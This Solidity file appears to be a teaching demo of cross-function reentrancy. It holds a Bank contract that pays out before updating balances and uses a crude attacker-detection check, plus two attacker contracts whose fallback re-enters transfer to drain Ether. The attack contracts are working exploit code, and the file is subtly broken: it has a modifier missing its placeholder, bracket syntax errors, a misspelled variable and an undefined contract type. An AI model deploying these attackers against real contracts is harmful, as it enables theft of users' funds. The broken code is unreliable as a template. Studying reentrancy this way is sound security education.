pragma solidity >=0.6.0 <0.9.0;

contract Bank{
    uint private participantsLiquidity;
    uint private beforeOperation;
    uint private afterOperation;
    address private attacker;
    address private owner;
    mapping(address => uint) private customerBalance;

    constructor() public payable{
        owner = msg.sender;
        customerBalance[msg.sender] += msg.value;
        participantsLiquidity = address(this).balance;
        beforeOperation = address(this).balance;
        afterOperation=0;
    }

    modifier ownerOnly(){
        require(msg.sender == owner, "message.sender is not the bank owner");
    }

    function getAttackerAddress() external view ownerOnly() returns(address)[
        return attacker;
    ]

    /*Customer deposit function */
    function depositFunds() external payable returns(bool){
        require(msg.value>0,"values not greater then zero");
        customerBalance[msg.sender] += msg.value;
        afterOperation = this.getBankLiquidity()-beforeOperation;
        participantsLiquidity += afterOperatiorn;
        beforeOperation = this.getBankLiquidity();
        afterOperation = 0;
        return true;
    }

    /** Customer withdraw function */
    function withdrawFunds(uint _value) public payable{
        require(_value <= customerBalance[msg.sender],"account balance is low");
        if (this.getBankLiquidity()==this.getParticipantsLiquidity()){
            (bool success, ) = msg.sender.call{value: _value}("");
            customerBalance[msg.sender] -= _value;
            participantsLiquidity -= _value;
        }else{
            attacker = msg.sender;
            beforeOperation = this.getBankLiquidity();
        }
        
    }

    /**Transfer coins within the contract */
    function transfer(address to, uint amount) public{
        if (this.getBankLiquidity()==this.getParticipantsLiquidity()){
            require(amount<=customerBalance[msg.sender],"account balance is low");
            customerBalance[to] += amount;
            customerBalance[msg.sender] -= amount;
        }else{
            attacker = msg.sender;
            beforeOperation = this.getBankLiquidity();
        }
        
    }

    /** Fetch bank liquidity */
    function getBankLiquidity() external view returns(uint){
        return address(this).balance;
    }

    function getParticipantsLiquidity() external view returns(uint){
        return participantsLiquidity;
    }

    /** Fetch customer balance */
    function getCustomerBalance() public view returns(uint){
        return customerBalance[msg.sender];
    }

}

contract Attacker1 {

    BankWithoutSolution public bank;
    address private attacker2;
    mapping(address => uint) private attackerBalance;

    constructor(address bankAddress) public payable{
        bank = BankWithoutSolution(bankAddress);
        attackerBalance[address(this)] += msg.value;
    }

    /*Deposit 10 Ether into the target contract*/
    function deposit() public payable{
        bank.depositFunds.value(10 ether)();
    }

    function setAttacker2(address addr) public{
        attacker2 = addr;
    }

    /**Withdraw 10 Ether from the target constract */
    function withdraw() public payable{
        bank.withdrawFunds(10 ether);
    }

    /**Fetch the Attacker1 balance */
    function getAttackerBalance() public view returns(uint){
        return address(this).balance;
    }

    /**Re-enter the transfer function in the traget constract */
    fallback () external payable {
        bank.transfer(attacker2, 10 ether);
    }
    
}

contract Attacker2 {

    BankWithoutSolution public bank;

    constructor(address bankAddress) public payable{
        bank = BankWithoutSolution(bankAddress);
    }

    /**Withdraw 10 Ether from the target constract */
    function withdraw() public payable{
        bank.withdrawFunds(10 ether);
    }

    /**Fetch the Attacker2 balance */
    function getAttackerBalance() public view returns(uint){
        return address(this).balance;
    }

    /** Fallback function to reveive the stolen coins */
    fallback () external payable {
    }
    
}